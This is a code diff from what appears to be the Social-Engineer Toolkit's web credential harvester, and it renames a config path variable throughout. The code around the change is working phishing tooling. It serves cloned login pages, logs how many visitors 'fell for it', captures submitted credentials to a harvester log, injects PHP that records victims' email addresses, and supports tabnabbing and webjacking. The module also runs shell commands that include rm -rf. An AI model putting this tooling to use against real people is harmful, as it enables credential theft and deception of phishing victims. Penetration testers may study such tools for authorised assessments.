@@ -75,7 +75,7 @@ except Exception as err:
 
 
 attack_vector = ""
-fileopen = open(setdir + "/attack_vector", "r")
+fileopen = open(userconfigpath + "attack_vector", "r")
 for line in fileopen:
     line = line.rstrip()
     if line == 'multiattack':
@@ -111,7 +111,7 @@ for line in fileopen:
     if match2:
         command_center = "on"
         command_center_write = open(
-            setdir + "/cc_harvester_hit" % (setdir), "w")
+            userconfigpath + "cc_harvester_hit" % (userconfigpath), "w")
 
 # if nada default port 80
 if counter == 0:
@@ -119,7 +119,7 @@ if counter == 0:
 
 # pull URL field
 counter = 0
-fileopen = open(setdir + "/site.template", "r").readlines()
+fileopen = open(userconfigpath + "site.template", "r").readlines()
 for line in fileopen:
     line = line.rstrip()
     match = re.search("URL=", line)
@@ -166,10 +166,10 @@ for line in fileopen:
                 sys.path.append("src/core/ssl")
                 # import our ssl module
                 import setssl
-                subprocess.Popen("cp %s/CA/*.pem %s" % (setdir, setdir),
+                subprocess.Popen("cp %s/CA/*.pem %s" % (userconfigpath, userconfigpath),
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                 # remove old junk we dont need anymore
-                subprocess.Popen("rm -rf %s/CA;cp *.pem %s" % (setdir, setdir),
+                subprocess.Popen("rm -rf %s/CA;cp *.pem %s" % (userconfigpath, userconfigpath),
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
         # if user wants to specify his/her own PEM certificate
@@ -184,7 +184,7 @@ for line in fileopen:
                         print("\nUnable to find PEM file, check location and config again.")
                         exit_set()
                     if os.path.isfile(pem_client):
-                        subprocess.Popen("cp %s %s/newcert.pem" % (pem_client, setdir),
+                        subprocess.Popen("cp %s %s/newcert.pem" % (pem_client, userconfigpath),
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                 match2 = re.search("PEM_SERVER=", line)
                 if match2:
@@ -193,7 +193,7 @@ for line in fileopen:
                         print("\nUnable to find PEM file, check location and config again.")
                         exit_set()
                     if os.path.isfile(pem_server):
-                        subprocess.Popen("cp %s %s/newreq.pem" % (pem_server, setdir),
+                        subprocess.Popen("cp %s %s/newreq.pem" % (pem_server, userconfigpath),
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 
 # url decode for postbacks
@@ -211,8 +211,8 @@ def urldecode(url):
 
 
 # here is where we specify how many people actually visited versus fell for it
-visits = open(setdir + "/visits.file", "a")
-bites = open(setdir + "/bites.file", "a")
+visits = open(userconfigpath + "visits.file", "a")
+bites = open(userconfigpath + "bites.file", "a")
 
 # SET Handler for handling POST requests and general setup through SSL
 
@@ -247,7 +247,7 @@ class SETHandler(BaseHTTPRequestHandler):
             #print('-' * 40)
             pass
 
-        webroot = os.path.abspath(os.path.join(setdir, 'web_clone'))
+        webroot = os.path.abspath(os.path.join(userconfigpath, 'web_clone'))
         requested_file = os.path.abspath(os.path.join(webroot, self.path))
         # try block setup to catch transmission errors
         try:
@@ -256,7 +256,7 @@ class SETHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header('Content_type', 'text/html')
                 self.end_headers()
-                fileopen = open(setdir + "/web_clone/index.html", "r")
+                fileopen = open(userconfigpath + "web_clone/index.html", "r")
                 for line in fileopen:
                     self.wfile.write(line)
                 # write out that we had a visit
@@ -268,7 +268,7 @@ class SETHandler(BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header('Content_type', 'text/html')
                 self.end_headers()
-                fileopen = open(setdir + "/web_clone/index2.html", "r")
+                fileopen = open(userconfigpath + "web_clone/index2.html", "r")
                 for line in fileopen:
                     self.wfile.write(line)
                 # write out that we had a visit
@@ -310,7 +310,7 @@ class SETHandler(BaseHTTPRequestHandler):
         # change path to root for append on file
         os.chdir(homepath)
         # put the params into site.template for later user
-        filewrite = open(setdir + "/site.template", "a")
+        filewrite = open(userconfigpath + "site.template", "a")
         filewrite.write("\n")
         if not os.path.isfile("%s/src/logs/harvester.log" % (os.getcwd())):
             filewrite3 = open("%s/src/logs/harvester.log" % os.getcwd(), "w")
@@ -356,7 +356,7 @@ class SETHandler(BaseHTTPRequestHandler):
 
         # pull URL field
         counter = 0
-        fileopen = open(setdir + "/site.template", "r").readlines()
+        fileopen = open(userconfigpath + "site.template", "r").readlines()
         for line in fileopen:
             line = line.rstrip()
             match = re.search("URL=", line)
@@ -380,7 +380,7 @@ class SETHandler(BaseHTTPRequestHandler):
             '<html><head><meta HTTP-EQUIV="REFRESH" content="0; url=%s"></head></html>' % (RAW_URL))
 
         # set it back to our homepage
-        os.chdir(setdir + "/web_clone/")
+        os.chdir(userconfigpath + "web_clone/")
 
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
@@ -526,37 +526,37 @@ def run():
                              (logpath, harvester_file), shell=True).wait()
 
         # if we are using webjacking, etc.
-        if os.path.isfile(setdir + "/web_clone/index2.html"):
+        if os.path.isfile(userconfigpath + "web_clone/index2.html"):
             # need to copy the files over - remove the old one first if there
             if os.path.isfile(apache_dir + "/index2.html"):
                 os.remove(apache_dir + "/index2.html")
 
-            shutil.copyfile(setdir + "/web_clone/index2.html",
+            shutil.copyfile(userconfigpath + "web_clone/index2.html",
                             apache_dir + "/index2.html")
 
         # here we specify if we are tracking users and such
         if track_email == True:
-            fileopen = open(setdir + "/web_clone/index.html", "r")
+            fileopen = open(userconfigpath + "web_clone/index.html", "r")
             data = fileopen.read()
             data = data.replace(
                 "<body>", """<body><?php $file = '%s'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>""" % (harvester_file))
-            filewrite = open(setdir + "/web_clone/index.2", "w")
+            filewrite = open(userconfigpath + "web_clone/index.2", "w")
             filewrite.write(data)
             filewrite.close()
-            os.remove(setdir + "/web_clone/index.html")
-            shutil.copyfile(setdir + "/web_clone/index.2",
-                            setdir + "/web_clone/index.html")
+            os.remove(userconfigpath + "web_clone/index.html")
+            shutil.copyfile(userconfigpath + "web_clone/index.2",
+                            userconfigpath + "web_clone/index.html")
             # copy the entire web_clone directory.
             # Without this only index.php|html are copied even though the user
             # may have chosen to import the entire directory in the set module.
-            copyfolder(setdir + "/web_clone", apache_dir)
+            copyfolder(userconfigpath + "web_clone", apache_dir)
         if os.path.isfile("%s/index.html" % (apache_dir)):
             os.remove("%s/index.html" % (apache_dir))
         if track_email == False:
-            shutil.copyfile(setdir + "/web_clone/index.html",
+            shutil.copyfile(userconfigpath + "web_clone/index.html",
                             "%s/index.html" % (apache_dir))
         if track_email == True:
-            shutil.copyfile(setdir + "/web_clone/index.html",
+            shutil.copyfile(userconfigpath + "web_clone/index.html",
                             "%s/index.php" % (apache_dir))
             print_status(
                 "NOTE: The URL to click on is index.php NOT index.html with track emails.")
@@ -615,7 +615,7 @@ if webattack_email == True:
         module_reload(src.phishing.smtp.client.smtp_web)
 
 # see if we're tabnabbing or multiattack
-fileopen = open(setdir + "/attack_vector", "r")
+fileopen = open(userconfigpath + "attack_vector", "r")
 for line in fileopen:
     line = line.rstrip()
     if line == 'tabnabbing':
@@ -628,12 +628,12 @@ for line in fileopen:
 if ssl_flag == 'true':
     web_port = "443"
     # check for PEM files here
-    if not os.path.isfile(setdir + "/newreq.pem"):
+    if not os.path.isfile(userconfigpath + "newreq.pem"):
         print("PEM files not detected. SSL will not work properly.")
-    if not os.path.isfile(setdir + "/newcert.pem"):
+    if not os.path.isfile(userconfigpath + "newcert.pem"):
         print("PEM files not detected. SSL will not work properly.")
     # copy over our PEM files
-    subprocess.Popen("cp %s/*.pem %s/web_clone/" % (setdir, setdir),
+    subprocess.Popen("cp %s/*.pem %s/web_clone/" % (userconfigpath, userconfigpath),
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
     # copy patched socket over to web clone
     definepath = os.getcwd()
@@ -643,7 +643,7 @@ if ssl_flag == 'true':
 
 # head over to cloned dir
 if apache_check == False:
-    os.chdir(setdir + "/web_clone/")
+    os.chdir(userconfigpath + "web_clone/")
 
 if attack_vector != "multiattack":
     if apache_check == False:
